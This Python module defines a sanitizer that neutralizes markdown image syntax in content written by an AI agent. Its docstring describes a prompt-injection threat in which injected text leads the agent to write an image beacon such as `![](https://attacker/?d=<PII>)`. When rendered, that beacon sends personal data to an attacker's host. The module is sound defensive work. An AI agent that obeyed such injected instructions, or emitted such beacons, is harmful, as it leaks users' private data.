"""Write-boundary sanitizers for agent-authored journal/document content.

Defense in depth against P0-3 (upload security threat model, AC-6): an
injected instruction can make the agent write a markdown image beacon
(`![](https://attacker/?d=<PII>)`) into a durable store. The web renderer fix
(`frontend/components/markdown-renderer.tsx`) stops it from auto-loading
today, but a future renderer (iOS, email, a future web chat) might not know
to defend itself. Stripping the beacon at the agent write boundary means the
stored content can never become an auto-loading `<img>` regardless of which
renderer reads it later.

Nothing in this app writes legitimate markdown images (`git grep '!\['`
turns up none), so this neutralizes *every* markdown image form rather than
trying to distinguish remote from local URLs — inline (`![alt](url)`),
reference-style (`![alt][ref]`), angle-bracket destinations
(`![alt](<url>)`), and nested brackets in the alt text up to 3 levels deep
(`![a[b[c[d]e]f]g](url)`) are all covered. An escaped bang is handled by
backslash parity, not a simple "preceded by a backslash" check: an EVEN
number of leading backslashes (0, 2, 4…) means the "!" itself is unescaped —
each backslash pair is a literal `\\`, so the image syntax is real and gets
neutralized (backslashes preserved, bang dropped); an ODD count (1, 3…)
means the last backslash escapes the "!", so it is left untouched.

Coverage caps and residuals (not covered by design):
- Alt-text bracket nesting deeper than 3 levels is not detected — accepted
  as a vanishingly rare edge case for injected content.
- Raw HTML `<img src=...>` in the markdown source is not stripped here.
  `ReactMarkdown` in `markdown-renderer.tsx` does not render raw HTML by
  default, so this is inert on the web today — but a future renderer that
  *does* render raw HTML would need its own guard; this function only
  neutralizes markdown image syntax.
- An image reference split across a fenced code block boundary (so the
  `![...]( ` and the `)` land in different otherwise-unrelated text) is not
  specially detected; accepted as a rare edge case.
- Two agent-write surfaces are not yet wired to this sanitizer: goals
  (`RuntimeGoalListCreateView`) and weekly reviews (`RuntimeWeeklyReviewsView`)
  in `runtime_views.py`. Both are web-safe today because the renderer
  override in `markdown-renderer.tsx` neutralizes the beacon regardless of
  what is stored — server-side stripping for these two is a follow-up, not
  done here to keep this change scoped.
"""

from __future__ import annotations

import re

# Alt-text label matcher, built bottom-up since Python's `re` has no
# recursion: _LEVEL0 is a bracket group with no nested brackets; each
# subsequent level allows one more level of nesting inside it. _LABEL (used
# below) is the outermost alt-text bracket, which may contain a _LEVEL2
# group — so bracket nesting up to 3 levels deep inside the label is
# recognized as image syntax, not just the outermost pair.
_LEVEL0 = r"\[[^\[\]]*\]"
_LEVEL1 = rf"\[(?:[^\[\]]|{_LEVEL0})*\]"
_LEVEL2 = rf"\[(?:[^\[\]]|{_LEVEL1})*\]"
_LABEL = rf"\[(?:[^\[\]]|{_LEVEL2})*\]"

# Captures any run of leading backslashes so the replacement callback can
# decide, by parity, whether the "!" is actually escaped (see module
# docstring). The lookahead requires the "!" to be immediately followed by
# a bracketed label, then optional whitespace, then either "(" (inline
# destination, including angle-bracket forms like `(<url>)`) or "["
# (reference-style `![alt][ref]`) — matching real markdown image syntax.
_IMAGE_BANG_RE = re.compile(rf"(\\*)!(?={_LABEL}\s*[(\[])")


def _strip_or_keep_bang(match: re.Match[str]) -> str:
    backslashes = match.group(1)
    if len(backslashes) % 2 == 0:
        # Even count: the "!" is unescaped (each pair is a literal "\\") —
        # this is real image syntax. Drop the bang, keep the backslashes.
        return backslashes
    # Odd count: the last backslash escapes the "!" — not image syntax,
    # leave the original text (backslashes + "!") untouched.
    return match.group(0)


def neutralize_remote_image_markdown(text: str) -> str:
    """Turn markdown image syntax `![alt](url)` / `![alt][ref]` into a plain
    link `[alt](url)` / `[alt][ref]` by dropping the leading "!".

    Every image form is affected (see module docstring for the exact
    coverage) except a genuinely escaped `\\![...]` (odd backslash count),
    which is left as-is. Plain text and ordinary (non-image) links are
    returned untouched.
    """
    if not text:
        return text
    return _IMAGE_BANG_RE.sub(_strip_or_keep_bang, text)
